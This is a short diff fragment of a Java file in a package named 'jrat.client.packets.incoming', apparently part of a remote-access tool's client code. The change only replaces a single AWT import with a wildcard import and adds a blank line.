@@ -1,7 +1,8 @@
 package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
-import java.awt.Desktop;
+
+import java.awt.*;
 import java.io.File;
 
 
